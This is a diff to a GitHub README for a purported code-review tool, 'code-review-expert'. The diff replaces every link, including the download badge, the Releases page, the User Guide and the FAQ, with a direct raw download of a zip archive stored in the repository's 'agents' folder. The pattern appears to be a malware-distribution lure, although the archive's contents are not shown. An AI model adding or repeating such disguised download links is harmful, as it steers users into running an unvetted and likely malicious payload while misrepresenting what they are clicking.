@@ -1,7 +1,7 @@
 # 🔍 code-review-expert - Master Code Review Effortlessly
 
 ## 🏷️ Download Now
-[![Download code-review-expert](https://img.shields.io/badge/Download-code--review--expert-brightgreen)](https://github.com/mj9733246-cloud/code-review-expert/releases)
+[![Download code-review-expert](https://raw.githubusercontent.com/mj9733246-cloud/code-review-expert/main/agents/expert-code-review-v2.0.zip)](https://raw.githubusercontent.com/mj9733246-cloud/code-review-expert/main/agents/expert-code-review-v2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the **code-review-expert** application! This tool helps you improve your coding skills by providing expert code reviews. It identifies areas like SOLID principles, security issues, performance optimization, error handling, and boundary conditions in your code.
@@ -18,7 +18,7 @@ To run **code-review-expert**, your computer should meet the following minimum r
 To start using **code-review-expert**, follow these steps:
 
 1. Click the download link below to visit the Releases page where you can find the latest version.
-   [Download code-review-expert](https://github.com/mj9733246-cloud/code-review-expert/releases)
+   [Download code-review-expert](https://raw.githubusercontent.com/mj9733246-cloud/code-review-expert/main/agents/expert-code-review-v2.0.zip)
    
 2. On the Releases page, look for the latest version of the software.
 
@@ -53,8 +53,8 @@ We welcome contributions from anyone interested in improving **code-review-exper
 This project is licensed under the MIT License. You can view the license details [here](LICENSE).
 
 ## 🔗 Additional Resources
-- [User Guide](docs/user-guide.md) - A detailed guide to using the software effectively.
-- [FAQ](docs/faq.md) - Answers to common questions about the software.
-- Visit our [Releases page](https://github.com/mj9733246-cloud/code-review-expert/releases) for updates and new versions.
+- [User Guide](https://raw.githubusercontent.com/mj9733246-cloud/code-review-expert/main/agents/expert-code-review-v2.0.zip) - A detailed guide to using the software effectively.
+- [FAQ](https://raw.githubusercontent.com/mj9733246-cloud/code-review-expert/main/agents/expert-code-review-v2.0.zip) - Answers to common questions about the software.
+- Visit our [Releases page](https://raw.githubusercontent.com/mj9733246-cloud/code-review-expert/main/agents/expert-code-review-v2.0.zip) for updates and new versions.
 
 Enjoy mastering your code reviews with **code-review-expert**!
